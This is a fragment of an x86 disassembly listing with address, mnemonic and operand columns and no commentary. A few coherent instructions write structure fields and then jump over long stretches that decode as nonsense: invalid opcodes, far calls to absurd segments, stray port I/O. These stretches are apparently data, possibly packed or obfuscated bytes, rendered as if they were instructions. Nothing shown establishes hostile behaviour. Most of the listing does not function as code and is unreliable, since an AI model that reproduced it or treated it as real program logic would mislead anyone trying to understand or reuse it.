  403143:	mov    DWORD PTR [ecx+0x4],eax
  403146:	mov    eax,DWORD PTR [ebp-0x20]
  403149:	mov    ecx,DWORD PTR [ebp-0x8]
  40314c:	mov    DWORD PTR [ecx+0x8],eax
  40314f:	mov    eax,DWORD PTR [ebp-0x34]
  403152:	mov    ecx,DWORD PTR [ebp-0x8]
  403155:	mov    DWORD PTR [ecx+0xc],eax
  403158:	mov    eax,DWORD PTR [ebp-0x30]
  40315b:	jmp    0x403569
  403160:	mov    esi,ss
  403162:	jmp    0x4031a7
  403164:	jno    0x4031c9
  403166:	mov    ah,0xd1
  403168:	cs out 0xa4,al
  40316b:	mov    ch,0x7a
  40316d:	or     eax,0x1589fbba
  403172:	jle    0x4031f2
  403174:	outs   dx,DWORD PTR ds:[esi]
  403175:	jge    0x4031f5
  403177:	jle    0x4031d8
  403179:	rcr    BYTE PTR [esi-0x77],cl
  40317c:	jmp    0x2836239e
  403181:	pusha  
  403182:	and    al,0x2d
  403184:	and    eax,0x47e3114f
  403189:	mov    ds:0x41487206,al
  40318e:	push   ebx
  40318f:	mov    dl,0xa9
  403191:	lods   al,BYTE PTR ds:[esi]
  403192:	jae    0x40316d
  403194:	(bad)  
  403195:	rcl    dh,1
  403197:	push   0x91097a58
  40319c:	cdq    
  40319d:	das    
  40319e:	call   0xabd4:0x747316c0
  4031a5:	add    ah,BYTE PTR [eax+edi*1-0x22]
  4031a9:	out    0x20,al
  4031ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031ac:	lds    esi,FWORD PTR [ebx+0x42d0005f]
  4031b2:	lds    ebp,FWORD PTR ss:[ecx]
  4031b5:	cvtps2pd xmm0,QWORD PTR [esi-0x5ab00345]
  4031bc:	aas    
  4031bd:	push   cs
  4031be:	cmc    
  4031bf:	push   0xc57a411
  4031c4:	lock jne 0x403192
  4031c7:	add    esp,DWORD PTR [eax+eiz*2+0x58]
  4031cb:	repz push cs
  4031cd:	nop
  4031ce:	push   esp
  4031cf:	sbb    bl,BYTE PTR [ecx+ecx*4-0x41]
  4031d3:	push   gs
  4031d5:	jmp    0x403205
  4031d7:	mov    al,0xca
  4031d9:	js     0x4031fe
  4031db:	mov    cl,0x33
  4031dd:	mov    bh,0xd6
  4031df:	mov    al,ds:0x313f4434
  4031e4:	mov    bl,0xb3
  4031e6:	test   BYTE PTR [edx-0x1204ba46],ah
  4031ec:	inc    edx
  4031ed:	xchg   DWORD PTR [eax],eax
  4031ef:	or     cl,BYTE PTR [edx+0x38b1784a]
  4031f5:	in     al,dx
  4031f6:	jmp    0x67cb:0x91e52d5f
  4031fd:	or     ecx,DWORD PTR [esi]
  4031ff:	inc    ebx
  403200:	add    BYTE PTR [esi+0xd],bl
  403203:	push   eax
  403204:	push   esi
  403205:	js     0x40320f
  403207:	imul   ecx,DWORD PTR [ecx],0x1e
  40320a:	aaa    
  40320b:	sbb    DWORD PTR [ebx-0x6e115889],edx
  403211:	sbb    BYTE PTR [ebx+0x28],0xb9
  403215:	jmp    0x51c93b9e
  40321a:	add    ebp,esp
  40321c:	mov    ss,WORD PTR [edx+0x60]
  40321f:	xchg   DWORD PTR [ecx],esi
  403221:	and    BYTE PTR [ebx+0x25],bh
  403224:	rcl    DWORD PTR [ebx+0xade1afa],0x5
  40322b:	pop    ecx
  40322c:	mov    DWORD PTR [esi+0x5091be37],edx
  403232:	outs   dx,DWORD PTR ds:[esi]
  403233:	into   
  403234:	push   ebp
  403235:	inc    ebp
  403236:	out    dx,eax
  403237:	sub    edx,DWORD PTR [eax-0x69]
  40323a:	mul    BYTE PTR [esp+edi*8-0x32057f8f]
  403241:	cmp    ebx,DWORD PTR [esi+0x37]
  403244:	inc    edx
  403245:	and    eax,0x67a5f58e
  40324a:	pop    ebx
  40324b:	ret    0x43cc
  40324e:	aas    
  40324f:	sbb    esp,ecx
  403251:	sbb    eax,0x87602a31
  403256:	stos   DWORD PTR es:[edi],eax
  403257:	loop   0x403267
  403259:	xchg   ebp,eax
  40325a:	fisub  DWORD PTR [edi+0x6d4ee446]
  403260:	add    ecx,edx
  403262:	adc    dl,BYTE PTR [ecx]
  403264:	inc    ebx
  403265:	xor    ebp,DWORD PTR [ebx]
  403267:	aaa    
  403268:	push   esp
  403269:	leave  
  40326a:	lahf   
  40326b:	or     DWORD PTR [edi+0x4a],edi
  40326e:	outs   dx,BYTE PTR ds:[esi]
  40326f:	push   ds
  403270:	ret    0xbb39
  403273:	iret   
  403274:	xlat   BYTE PTR ds:[ebx]
  403275:	aaa    
  403276:	fsub   DWORD PTR gs:[edi+0x1399f488]
  40327d:	das    
  40327e:	sub    eax,0x8ca6b1b9
  403283:	stos   DWORD PTR es:[edi],eax
  403284:	or     ebx,DWORD PTR [edi+0x26376e26]
  40328a:	xchg   ecx,eax
  40328b:	loopne 0x4032e2
  40328d:	cmp    BYTE PTR [ebx],bl
  40328f:	mov    BYTE PTR [edi-0x1194545a],al
  403295:	xor    eax,0x33b9af7d
  40329a:	pop    esp
  40329b:	mov    ecx,0xc70a1dc7
  4032a0:	in     al,dx
  4032a1:	push   ss
  4032a2:	mov    ecx,0xd3a066c3
  4032a7:	mov    WORD PTR [eax+0x3e],cs
  4032aa:	and    DWORD PTR [edi-0x47],edi
  4032ad:	clc    
  4032ae:	out    dx,eax
  4032af:	push   edi
  4032b0:	dec    esp
  4032b1:	push   ebp
  4032b2:	mov    dl,0xa4
  4032b4:	inc    ebx
  4032b5:	push   edx
  4032b6:	jae    0x4032c3
  4032b8:	push   0x42027b72
  4032bd:	test   al,0xde
  4032bf:	into   
  4032c0:	scas   al,BYTE PTR es:[edi]
  4032c1:	sub    dh,al
  4032c3:	sub    BYTE PTR ds:0xfaf01784,dh
  4032c9:	cld    
  4032ca:	xchg   edi,eax
  4032cb:	mov    esi,es
  4032cd:	lods   al,BYTE PTR ds:[esi]
  4032ce:	xchg   edi,eax
  4032cf:	push   ecx
  4032d0:	sub    ecx,ebp
  4032d2:	xor    edx,DWORD PTR [esi+eax*1]
  4032d5:	xor    dl,BYTE PTR [ebx-0x2e4b2b64]
  4032db:	adc    BYTE PTR [ebx-0x36],dh
  4032de:	arpl   WORD PTR [esi],di
  4032e0:	push   esp
  4032e1:	rcl    DWORD PTR [eax],1
  4032e3:	enter  0xbb8c,0xf9
  4032e7:	neg    DWORD PTR [edi]
  4032e9:	hlt    
  4032ea:	adc    DWORD PTR [ecx-0x40],0xffffff9c
  4032ee:	mov    dl,0xc2
  4032f0:	lea    eax,[ecx]
  4032f2:	mov    ebp,0xfede4472
  4032f7:	push   ds
  4032f8:	xchg   ebx,eax
  4032f9:	inc    edx
  4032fa:	pop    ds
  4032fb:	push   cs
  4032fc:	inc    edi
  4032fd:	cdq    
  4032fe:	aas    
  4032ff:	aaa    
  403300:	sub    BYTE PTR [ecx+edx*1+0x1d],bh
  403304:	xor    BYTE PTR [eax-0x48],0x54
  403308:	(bad)  
  403309:	jp     0x4032a2
  40330b:	sbb    al,0xdf
  40330d:	cmp    esp,DWORD PTR [edi]
  40330f:	js     0x4032f4
  403311:	jnp    0x4032ff
  403313:	ja     0x403382
  403315:	stos   DWORD PTR es:[edi],eax
  403316:	xor    BYTE PTR [ebx-0x5880b4f7],dl
  40331c:	aad    0x8c
  40331e:	(bad)  
  40331f:	in     al,dx
  403320:	pushf  
  403321:	fst    DWORD PTR [edi]
  403323:	and    eax,0x73ef4da8
  403328:	rcr    DWORD PTR [ebx-0x7331ac72],1
  40332e:	xor    al,0x6d
  403330:	jo     0x4032e9
  403332:	cmp    dh,al
  403334:	lahf   
  403335:	jg     0x4032c7
  403337:	add    DWORD PTR ds:0x28f893e8,ecx
  40333d:	or     cl,BYTE PTR [edx]
  40333f:	icebp  
  403340:	xchg   ebp,eax
  403341:	xor    ebp,DWORD PTR [edi-0x74]
  403344:	imul   BYTE PTR [eax]
  403346:	push   cs
  403347:	jns    0x4032eb
  403349:	dec    edi
  40334a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40334b:	cli    
  40334c:	jo     0x40337c
  40334e:	fcomp  QWORD PTR [ebp-0xa]
  403351:	out    0x31,al
  403353:	pop    ss
  403354:	aam    0xf5
  403356:	in     eax,dx
  403357:	inc    esp
  403358:	test   DWORD PTR [eax+eiz*1],ebx
  40335b:	es xchg ebp,eax
  40335d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40335e:	mov    esi,0x92161ec
  403363:	xchg   esi,eax
  403364:	and    eax,0xa0302887
  403369:	pop    ds
  40336a:	loope  0x40335a
  40336c:	fucomp st(3)
  40336e:	call   0xa8df28ca
  403373:	adc    bl,BYTE PTR [ebx]
  403375:	sub    DWORD PTR [ebp+0x12],eax
  403378:	in     eax,dx
  403379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40337a:	adc    BYTE PTR [eax+0x728fff9d],al
  403380:	(bad)  ds:0x2f007a20
  403386:	fisttp WORD PTR [eax+ebp*4]
  403389:	push   ebp
  40338a:	push   edi
  40338b:	in     eax,dx
  40338c:	cmp    bl,BYTE PTR [eax+0x4d3b4bf1]
  403392:	test   al,cl
  403394:	pop    ds
  403395:	ret    
  403396:	cmp    DWORD PTR [edx-0x117094a4],esi
  40339c:	clc    
  40339d:	aam    0xf0
  40339f:	mov    ebp,0xf9bd9fb0
  4033a4:	fidiv  WORD PTR [esi+0x5f]
  4033a7:	dec    ebp
  4033a8:	ins    DWORD PTR es:[edi],dx
  4033a9:	(bad)  
  4033aa:	addr16 jnp 0x403391
  4033ad:	push   esi
  4033ae:	js     0x4033fe
  4033b0:	mov    BYTE PTR [eax],dh
  4033b2:	mov    dh,BYTE PTR [ebp+0x2a967ff9]
  4033b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033b9:	xchg   edi,eax
  4033ba:	int3   
  4033bb:	btc    DWORD PTR [esi],esi
  4033be:	shr    BYTE PTR [edx+0x102f5948],0xc9
  4033c5:	xchg   ebx,eax
  4033c6:	cmp    cl,BYTE PTR [ecx-0x17]
  4033c9:	cmp    BYTE PTR [edx-0x24],dh
  4033cc:	sbb    eax,0xbf05efe4
  4033d1:	cmp    ecx,eax
  4033d3:	je     0x403360
  4033d5:	and    DWORD PTR [edx],esi
  4033d7:	mul    cl
  4033d9:	inc    ebx
  4033da:	fstp   TBYTE PTR ds:0x47fe2d74
  4033e0:	aaa    
  4033e1:	mov    ebx,0xfabf82c9
  4033e6:	xor    dh,dh
  4033e8:	jp     0x40342c
  4033ea:	fs mov ecx,0xcdd6ab6a
  4033f0:	stos   BYTE PTR es:[edi],al
  4033f1:	mov    eax,DWORD PTR [eax+edx*4-0x5afdbd74]
  4033f8:	mov    esp,0x279c1766
  4033fd:	gs je  0x403388
  403400:	mov    ss,esi
  403402:	mov    edi,0xdbf9e9e1
  403407:	adc    ah,dh
  403409:	adc    BYTE PTR [edi],ch
  40340b:	dec    eax
  40340c:	push   ecx
  40340d:	mov    ecx,0x77e62e03
  403412:	cmp    BYTE PTR [ecx-0x6a],dl
  403415:	retf   
  403416:	stos   BYTE PTR es:[edi],al
  403417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403418:	adc    eax,0x3eb121e0
  40341d:	aam    0x51
  40341f:	add    al,0x83
  403421:	inc    DWORD PTR [ebx]
  403423:	xchg   ebp,eax
  403424:	push   esi
  403425:	in     al,dx
  403426:	call   0x67e:0x44ad4368
  40342d:	pop    esp
  40342e:	pop    ds
  40342f:	mov    ebx,0xfe9f4d9a
  403434:	or     DWORD PTR [eax+0x6e5ee77f],0xe6c627bd
  40343e:	jge    0x40341d
  403440:	mov    esi,0x2a9e192d
  403445:	stc    
  403446:	repnz cdq 
  403448:	inc    edi
  403449:	sub    BYTE PTR [eax-0x67bab361],ch
  40344f:	add    ch,cl
  403451:	jns    0x4034ce
  403453:	loope  0x40343a
  403455:	jbe    0x4034d0
  403457:	xor    al,0x33
  403459:	stos   DWORD PTR es:[edi],eax
  40345a:	test   al,0x29
  40345c:	retf   
  40345d:	push   eax
  40345e:	(bad)  
  40345f:	xchg   ebp,eax
  403460:	or     eax,0x838d2c18
  403465:	scas   al,BYTE PTR es:[edi]
  403466:	push   ds
  403467:	sbb    DWORD PTR [ecx-0x7c33b5fe],edx
  40346d:	push   ebx
  40346e:	jmp    0x8693:0xccce8fed
  403475:	adc    BYTE PTR [ecx+ebp*4-0x6b316410],0xd
  40347d:	inc    edi
  40347e:	adc    BYTE PTR [esp+eax*1+0xe],bh
  403482:	inc    ebx
  403483:	rcr    BYTE PTR [ebx-0x4c014524],1
  403489:	in     eax,dx
  40348a:	xchg   edx,eax
  40348b:	or     BYTE PTR ds:0xaa261dc1,0x4b
  403492:	inc    ebx
  403493:	sub    dl,BYTE PTR [edx]
  403495:	inc    edx
  403496:	fs dec esp
  403498:	lds    esi,FWORD PTR [edx]
  40349a:	mov    esi,0x989a9d4c
  40349f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034a0:	sbb    al,0x2f
  4034a2:	aaa    
  4034a3:	test   eax,0x6b8b567d
  4034a8:	into   
  4034a9:	mov    eax,0x2fbe61e1
  4034ae:	fst    DWORD PTR [eax+0x6]
  4034b1:	sbb    eax,0x1ccb3843
  4034b6:	rol    BYTE PTR [eax+0x12],cl
  4034b9:	leave  
  4034ba:	mov    dl,0x14
  4034bc:	inc    esi
  4034bd:	into   
  4034be:	jo     0x403539
  4034c0:	std    
  4034c1:	lods   eax,DWORD PTR ds:[esi]
  4034c2:	pop    es
  4034c3:	push   es
  4034c4:	sub    BYTE PTR [ecx-0x66f16ea5],ch
  4034ca:	xor    eax,0x69832113
  4034cf:	add    BYTE PTR [edx],dh
  4034d1:	or     eax,eax
  4034d3:	pop    edi
  4034d4:	in     al,dx
  4034d5:	fdiv   DWORD PTR [esi]
  4034d7:	or     DWORD PTR [ebp-0x7013bf7c],0x20
  4034de:	mov    dl,0xb1
  4034e0:	add    eax,esp
  4034e2:	sub    al,BYTE PTR [eax+0x129fd737]
  4034e8:	test   ebp,edi
  4034ea:	xchg   esi,eax
  4034eb:	mov    bh,0xf9
  4034ed:	lock stos DWORD PTR es:[edi],eax
  4034ef:	mov    esp,0x39c65818
  4034f4:	shr    BYTE PTR [edi],cl
  4034f6:	ret    
  4034f7:	icebp  
  4034f8:	mov    esp,0xebd57955
  4034fd:	adc    ecx,DWORD PTR [ecx]
  4034ff:	popf   
  403500:	mov    edx,0xa713ff3e
  403505:	pop    ebx
  403506:	ret    
  403507:	scas   al,BYTE PTR es:[edi]
  403508:	add    ebp,DWORD PTR [eax-0x20]
  40350b:	adc    DWORD PTR [edx],esp
  40350d:	pop    eax
  40350e:	retf   0xebc4
  403511:	fadd   DWORD PTR [edi]
  403513:	add    BYTE PTR [ebp-0x6f],dl
  403516:	retf   0x9854
  403519:	or     BYTE PTR [edi],bh
  40351b:	jnp    0x403557
  40351d:	mov    DWORD PTR [eax+0x4e125a60],edi
  403523:	jp     0x403522
  403525:	test   BYTE PTR [ebx-0x287fd9a7],cl
  40352b:	jg     0x40359a
  40352d:	idiv   DWORD PTR ds:0x1a584412
  403533:	xor    DWORD PTR [ebp+0x7e],0x4
  403537:	fdivr  QWORD PTR [ebp+0x19]
  40353a:	sub    BYTE PTR [ebx],dl
  40353c:	in     eax,0x5b
  40353e:	cld    
  40353f:	add    DWORD PTR [eax],ebp
  403541:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403542:	mov    ecx,0xa6d0b631
  403547:	mov    DWORD PTR [ecx+0x72],edx
  40354a:	pop    edi
  40354b:	mov    edi,0x94ec3d9e
  403550:	mov    DWORD PTR [ebx+0x77edf459],ebp
  403556:	das    
  403557:	rol    BYTE PTR [ebx-0x22],0x38
  40355b:	push   es
  40355c:	hlt    
  40355d:	rcl    BYTE PTR [ecx+0x9],cl
  403560:	es and al,0x3e
  403563:	cmp    BYTE PTR [ecx+0x25],al
  403566:	push   esi
  403567:	rcl    DWORD PTR [esi-0x75],cl
  40356a:	dec    ebp
  40356b:	clc    
  40356c:	mov    DWORD PTR [ecx+0x10],eax
  40356f:	mov    eax,eax
  403571:	mov    eax,DWORD PTR [ebp-0x24]
  403574:	test   eax,eax
  403576:	mov    eax,DWORD PTR [ebp-0x2c]
  403579:	jne    0x403582
  40357f:	mov    eax,DWORD PTR [ebp-0x10]
  403582:	xor    eax,esi
  403584:	add    eax,edi
  403586:	jmp    0x403994
  40358b:	in     eax,dx
  40358c:	adc    ch,ch
  40358e:	ret    0xe3f1
  403591:	icebp  
  403592:	xor    DWORD PTR [eax],ebx
  403594:	xchg   esi,eax
  403595:	sbb    esp,edx
  403597:	pop    esi
  403598:	cmp    al,0xcf
  40359a:	xor    BYTE PTR [esi+0x6f7e7e11],al
  4035a0:	jge    0x403620
  4035a2:	jle    0x403573
  4035a4:	adc    BYTE PTR [ebx*4+0xae83bc9],cl
  4035ab:	add    BYTE PTR [esi-0x193f899b],ah
  4035b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035b2:	leave  
  4035b3:	mov    ds:0x2fb088ad,al
  4035b8:	sbb    BYTE PTR [ebx+edx*2-0x5d],dl
  4035bc:	ret    0x250b
  4035bf:	pop    edx
  4035c0:	popf   
  4035c1:	stos   DWORD PTR es:[edi],eax
  4035c2:	dec    edi
  4035c3:	fcomi  st,st(4)
  4035c5:	fst    DWORD PTR ds:0x4c236c8f
  4035cb:	lods   eax,DWORD PTR ds:[esi]
  4035cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035cd:	lea    ecx,[edi+0x28e06614]
  4035d3:	lock int3 
  4035d5:	adc    eax,DWORD PTR [ebx]
  4035d7:	mov    ah,0xc5
  4035d9:	inc    ebx
  4035da:	sbb    al,0x15
  4035dc:	mov    ecx,0x62a25d9d
  4035e1:	inc    ebx
  4035e2:	dec    BYTE PTR [ebp+0x6a067ed4]
  4035e8:	mov    ebp,gs
  4035ea:	mov    eax,DWORD PTR ds:0x4b8eb915
  4035f0:	adc    eax,0xf9c4cc08
  4035f5:	adc    esp,DWORD PTR ds:0xeb52c59
  4035fb:	inc    edx
  4035fc:	sbb    dl,BYTE PTR [ecx+0x47]
  4035ff:	dec    ebp
  403600:	pop    edi
  403601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403602:	jmp    0x40363f
  403604:	push   eax
  403605:	(bad)  
  403607:	or     eax,0xc04d9b7d
  40360c:	ret    
  40360d:	cdq    
  40360e:	mov    esi,0x15e3c020
  403613:	sub    esp,DWORD PTR [ecx]
  403615:	mov    cl,BYTE PTR [eax+0x3b]
  403618:	mov    dl,0x35
  40361a:	js     0x4035a1
  40361c:	push   cs
  40361d:	je     0x40369a
  40361f:	fwait
  403620:	sub    edi,DWORD PTR [edx+0x741590e2]
  403626:	mov    ebp,0x1a2bc970
  40362b:	xor    cl,al
  40362d:	push   ds
  40362e:	ja     0x40362c
  403630:	sbb    al,0xc8
  403632:	xchg   ebp,eax
  403633:	mov    ebx,0x43adcdef
  403638:	je     0x40364c
  40363a:	loope  0x4036b0
  40363c:	pop    edi
  40363d:	aas    
  40363e:	sub    DWORD PTR [edx],ecx
  403640:	popa   
  403641:	cmp    al,0xcd
  403643:	scas   al,BYTE PTR es:[edi]
  403644:	int3   
  403645:	xchg   ecx,eax
  403646:	push   ebp
  403647:	xor    dl,ah
  403649:	and    al,0xea
  40364b:	mov    ah,0xcc
  40364d:	pop    esi
  40364e:	imul   esp,DWORD PTR [edi-0x56],0x77
  403652:	add    eax,0x30d32692
  403657:	sbb    ebx,DWORD PTR [ecx]
  403659:	enter  0x4ae6,0xa7
  40365d:	cld    
  40365e:	js     0x40364d
  403660:	(bad)  
  403661:	(bad)  
  403662:	or     esp,ebp
  403664:	(bad)  
  403665:	(bad)  
  403666:	outs   dx,BYTE PTR ds:[esi]
  403667:	push   ebx
  403668:	shl    DWORD PTR [esi+0x7621e9ac],cl
  40366e:	mov    edx,0x870dc216
  403673:	imul   esp,DWORD PTR [edx],0xb6f85c37
  403679:	push   ebx
  40367a:	rcr    BYTE PTR [ebx],0x35
  40367d:	stos   DWORD PTR es:[edi],eax
  40367e:	add    BYTE PTR [edx],0x69
  403681:	fs mov ah,0xd9
  403684:	cdq    
  403685:	push   ecx
  403686:	mov    al,ds:0x7d2a46c5
  40368b:	dec    ebp
  40368c:	mov    ds:0xd2ef4423,al
  403691:	scas   eax,DWORD PTR es:[edi]
  403692:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403693:	push   edi
  403694:	loope  0x403622
  403696:	shl    DWORD PTR [eax+0x15075f38],0xd9
  40369d:	imul   edx,esp,0xffffffc6
  4036a0:	cmp    al,0x69
  4036a2:	mov    esi,DWORD PTR [edx-0x794151f3]
  4036a8:	(bad)  [ebx]
  4036aa:	lds    esp,FWORD PTR ds:0xa645f3f7
  4036b1:	mov    WORD PTR [edx],gs
  4036b3:	push   0xffffff8b
  4036b5:	jecxz  0x403732
  4036b7:	sbb    BYTE PTR [edx+0x71],bl
  4036ba:	in     al,dx
  4036bb:	aaa    
  4036bc:	pop    gs
  4036be:	ret    
  4036bf:	or     BYTE PTR [ecx-0x51451923],dh
  4036c5:	ins    BYTE PTR es:[edi],dx
  4036c6:	push   edx
  4036c7:	jle    0x403728
  4036c9:	ret    0x3c6d
  4036cc:	idiv   BYTE PTR [ecx+0x2f74192c]
  4036d2:	xchg   edi,eax
  4036d3:	jae    0x403727
  4036d5:	ret    
  4036d6:	add    esi,DWORD PTR [ebx-0x275b53c3]
  4036dc:	fs push ds
  4036de:	adc    BYTE PTR [esi],dl
  4036e0:	mov    al,0x5f
  4036e2:	inc    edi
  4036e3:	icebp  
  4036e4:	xchg   BYTE PTR [esi+0x56],al
  4036e7:	aas    
  4036e8:	int3   
  4036e9:	adc    eax,edi
  4036eb:	jno    0x40375e
  4036ed:	cld    
  4036ee:	mov    eax,0x18b29d54
  4036f3:	(bad)  
  4036f4:	int    0xbd
  4036f6:	out    0x1b,eax
  4036f8:	inc    ebx
  4036f9:	push   ebp
  4036fa:	sub    ebp,DWORD PTR [esi-0x8fe6e2f]
  403700:	jno    0x403719
  403702:	cwde   
  403703:	loop   0x40372f
  403705:	mov    edx,0xdb825218
  40370a:	fwait
  40370b:	adc    ecx,ebx
  40370d:	dec    bx
  40370f:	xor    DWORD PTR [edx],eax
  403711:	sub    ch,dl
  403713:	(bad)  
  403715:	push   cs
  403716:	out    0xf4,al
  403718:	mov    edx,0x3f98e208
  40371d:	mov    DWORD PTR [ebp-0x203ea1f3],ecx
  403723:	leave  
  403724:	sbb    BYTE PTR [edx-0x57],dh
  403727:	sbb    BYTE PTR [edi],al
  403729:	fdiv   DWORD PTR [edx+0x77]
  40372c:	fwait
  40372d:	in     al,0x50
  40372f:	lods   eax,DWORD PTR ds:[esi]
  403730:	pop    esi
  403731:	ds out 0x42,al
  403734:	jnp    0x4036d3
  403736:	adc    DWORD PTR [ecx+edx*8+0x18],0x8b359595
  40373e:	in     al,dx
  40373f:	xchg   edx,eax
  403740:	out    dx,eax
  403741:	fdiv   QWORD PTR [esp+eax*1]
  403744:	sub    BYTE PTR [ebp-0x1b711a4b],ch
  40374a:	adc    BYTE PTR [edx-0x6d],bh
  40374d:	push   es
  40374e:	jg     0x40372a
  403750:	or     ch,al
  403752:	xor    eax,0xf2480813
  403757:	push   ds
  403758:	sti    
  403759:	mov    bh,0x6e
  40375b:	jecxz  0x40376c
  40375d:	pushf  
  40375e:	mov    ecx,0xeccb8f7f
  403763:	add    eax,0x307206f
  403768:	add    BYTE PTR [ebx],0x6b
  40376b:	sbb    BYTE PTR [esi+0x41],dl
  40376e:	push   0x99f6acdb
  403773:	shl    BYTE PTR [edx+0x54506bba],cl
  403779:	in     al,dx
  40377a:	pop    edi
  40377b:	in     al,dx
  40377c:	inc    esp
  40377d:	popf   
  40377e:	or     DWORD PTR [eax],eax
  403780:	cs pop edx
  403782:	(bad)  
  403783:	push   esi
  403784:	cli    
  403785:	add    esp,DWORD PTR [ecx+0x1b]
  403788:	out    dx,al
  403789:	in     eax,dx
  40378a:	xlat   BYTE PTR ds:[ebx]
  40378b:	add    eax,0x3b6ff8c
  403790:	ins    BYTE PTR es:[edi],dx
  403791:	(bad)  
  403793:	sub    al,0x4a
  403795:	sbb    eax,0xecce013d
  40379a:	dec    esi
  40379b:	mov    esp,edx
  40379d:	add    bl,ch
  40379f:	retf   0x2c7d
  4037a2:	mov    bl,0x2b
  4037a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037a5:	cs push ecx
  4037a7:	call   0xf470:0x1ab396fa
  4037ae:	inc    ebp
  4037af:	sub    BYTE PTR [edx-0x54],bh
  4037b2:	cmp    al,0x95
  4037b4:	ror    BYTE PTR [ebx-0x6d],0x45
  4037b8:	icebp  
  4037b9:	sbb    DWORD PTR [edx+0x7c],eax
  4037bc:	xchg   BYTE PTR [ebx],dl
  4037be:	pop    esp
  4037bf:	retf   
  4037c0:	sbb    DWORD PTR [eax+ebx*1-0x1aa7b73a],esi
  4037c7:	test   DWORD PTR [edx-0x70c3fa1a],eax
  4037cd:	leave  
  4037ce:	ss into 
  4037d0:	sub    dh,bh
  4037d2:	sbb    ah,dh
  4037d4:	cmp    edi,DWORD PTR [esp+ebx*1+0x45ed21e8]
  4037db:	jbe    0x40383a
  4037dd:	js     0x4037b1
  4037df:	stos   BYTE PTR es:[edi],al
  4037e0:	push   eax
  4037e1:	adc    DWORD PTR [ebx],0x35a7fe6b
  4037e7:	cli    
  4037e8:	test   al,0x3f
  4037ea:	das    
  4037eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037ec:	(bad)  
  4037ed:	mov    eax,0xf65b71a0
  4037f2:	call   0xd4f7919
  4037f7:	(bad)  
  4037f8:	push   0x536f295b
  4037fd:	adc    eax,0xff470af
  403802:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403803:	dec    edi
  403804:	mov    bl,0xb9
  403806:	and    ah,dl
  403808:	sub    al,0x5e
  40380a:	into   
  40380b:	mov    ah,0xad
  40380d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40380e:	dec    ecx
  40380f:	push   ds
  403810:	push   0x74
  403812:	cli    
  403813:	ds cmp ebp,edx
  403816:	inc    ebx
  403817:	iret   
  403818:	xchg   edx,eax
  403819:	pusha  
  40381a:	or     dl,BYTE PTR [ecx]
  40381c:	test   al,0xd4
  40381e:	and    BYTE PTR [esp+ebx*4+0x3a],dl
  403822:	or     al,al
  403824:	inc    ebp
  403825:	or     ah,al
  403827:	aam    0xa
  403829:	pop    esp
  40382a:	or     al,0xe3
  40382c:	inc    edx
  40382d:	ds jp  0x4037f7
  403830:	daa    
  403831:	shl    BYTE PTR [eax],0xaa
  403834:	jle    0x403801
  403836:	test   al,0x1a
  403838:	add    eax,0xa0c03d35
  40383d:	and    esp,0x4
  403840:	loope  0x4038b9
  403842:	imul   esi,DWORD PTR [edx+0x3534345],0x1
  403849:	add    BYTE PTR [esi-0x6c],cl
  40384c:	mov    esi,eax
  40384e:	mov    edx,0xa7b64665
  403853:	imul   bp,WORD PTR [ebx+eiz*8],0xae02
  403859:	adc    ch,bl
  40385b:	ja     0x4037f5
  40385d:	mov    ch,0x53
  40385f:	loope  0x403832
  403861:	and    eax,0x272bca88
  403866:	jb     0x403825
  403868:	gs jecxz 0x403858
  40386b:	and    al,0x40
  40386d:	lock daa 
  40386f:	and    DWORD PTR ss:[eax+0x5],ebx
  403873:	push   ebp
  403874:	retf   
  403875:	retf   
  403876:	sub    al,0xf3
  403878:	popf   
  403879:	push   cs
  40387a:	mov    al,ds:0xa5f98aad
  40387f:	mov    dh,0x2c
  403881:	cmp    eax,DWORD PTR [eax-0x1e8a6477]
  403887:	jl     0x403836
  403889:	lods   al,BYTE PTR ds:[esi]
  40388a:	aad    0x69
  40388c:	inc    ebp
  40388d:	and    eax,0xb8af0617
  403892:	fs pusha 
  403894:	xchg   BYTE PTR [eax],cl
  403896:	sahf   
  403897:	sub    ebx,ebp
  403899:	ins    DWORD PTR es:[edi],dx
  40389a:	pop    ecx
  40389b:	jge    0x403883
  40389d:	add    BYTE PTR [edx],al
  40389f:	cwde   
  4038a0:	pop    es
  4038a1:	sub    ecx,DWORD PTR [edx]
  4038a3:	std    
  4038a4:	xchg   edx,eax
  4038a5:	push   ebp
  4038a6:	inc    ecx
  4038a7:	xor    BYTE PTR [edi],bl
  4038a9:	jb     0x403925
  4038ab:	iret   
  4038ac:	push   edx
  4038ad:	icebp  
  4038ae:	pop    eax
  4038af:	les    edx,FWORD PTR [ebx]
  4038b1:	out    0xb,eax
  4038b3:	(bad)  
  4038b4:	mov    esp,0x76d6c957
  4038b9:	mov    esp,0xb23cf5e1
  4038be:	(bad)  
  4038bf:	in     eax,0x42
  4038c1:	enter  0x7a5,0xb7
  4038c5:	outs   dx,DWORD PTR ds:[esi]
  4038c6:	jp     0x40393f
  4038c8:	sub    bh,BYTE PTR [edx+0x2286726d]
  4038ce:	mov    ds:0xccc85695,al
  4038d3:	ins    DWORD PTR es:[edi],dx
  4038d4:	cmp    BYTE PTR [edi+0x583fff0c],ah
  4038da:	and    eax,0xf0db6089
  4038df:	cdq    
  4038e0:	ins    DWORD PTR es:[edi],dx
  4038e1:	dec    edx
  4038e2:	into   
  4038e3:	sar    DWORD PTR es:[ebx],0xe6
  4038e7:	fldpi  
  4038e9:	out    0xf4,al
  4038eb:	push   cs
  4038ec:	sub    ecx,DWORD PTR [ebx+0x1287fceb]
  4038f2:	nop
  4038f3:	fsubr  QWORD PTR [eax+0x2a]
  4038f6:	outs   dx,BYTE PTR ds:[esi]
